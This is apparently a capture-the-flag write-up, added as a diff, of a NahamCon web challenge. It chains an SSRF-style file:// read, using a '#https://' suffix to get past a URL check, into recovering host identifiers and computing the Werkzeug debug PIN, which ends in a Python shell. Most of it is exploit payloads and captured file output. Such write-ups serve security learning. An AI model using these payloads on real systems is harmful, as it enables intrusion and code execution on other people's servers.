@@ -1,0 +1,82 @@
+Werkzeug debug mode => console
+
+http://challenge.nahamcon.com:31604/console
+	Need PIN
+
+This pin can be calculated or can be set with an environment variable WERKZEUG_DEBUG_PIN
+
+http://challenge.nahamcon.com:31604/
+	We require a secure https:// destination!
+
+Bypass with
+	https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/#https://
+
+file:///etc/passwd#https://
+	work !
+
+file:///proc/self/environ#https://
+	MAIL=/var/mail/workerbee
+	USER=workerbee
+	HOME=/home/workerbee
+	LOGNAME=workerbee
+	PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+	LANG=C.UTF-8SHELL=/bin/sh
+	PWD=/home/workerbee
+	LC_ALL=C.UTF-8
+	WERKZEUG_SERVER_FD=3
+	WERKZEUG_RUN_MAIN=true
+
+No PIN, we have to calculate
+	Source: 
+		https://www.daehee.com/werkzeug-console-pin-exploit/
+		https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py
+
+
+# Get internet interface device id
+file:///proc/net/arp#https://
+	IP address       HW type     Flags       HW address            Mask     Device
+	169.254.1.1      0x1         0x2         ee:ee:ee:ee:ee:ee     *        eth0
+	10.128.0.10      0x1         0x2         ee:ee:ee:ee:ee:ee     *        eth0
+
+# Get MAC Address
+file:///sys/class/net/eth0/address#https://
+	16:39:90:6b:f0:cd
+
+	Convert to decimal
+
+	0x1639906bf0cd = 24436491940045
+
+# Get machine id, it uses the first not empty file of /etc/machine-id and /proc/sys/kernel/random/boot_id. After that it appends part of the first line of /proc/self/cgroup.
+
+file:///etc/machine-id#https://
+	empty
+
+file:///proc/sys/kernel/random/boot_id#https://
+	e55ba2dd-c593-474e-addf-7ba80b05171d
+
+file:///proc/self/cgroup#https://
+	12:cpuset:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	11:blkio:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	10:perf_event:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	9:freezer:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	8:hugetlb:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	7:pids:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	6:rdma:/
+	5:net_cls,net_prio:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	4:memory:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	3:cpu,cpuacct:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	2:devices:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	1:name=systemd:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a
+	0::/system.slice/containerd.service
+
+
+python
+	b"12:cpuset:/kubepods/pod4dd0db8c-116d-4b86-93b4-6fe607546079/f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a".strip().rpartition(b"/")[2]
+
+	=> b'f4219cec92b5fb74f54b1116583cb6127bf33a6ae3cbf01cebf286f31618356a'
+
+python3 pingen.py
+	216-358-070
+
+http://challenge.nahamcon.com:31604/console
+	Got a python shell
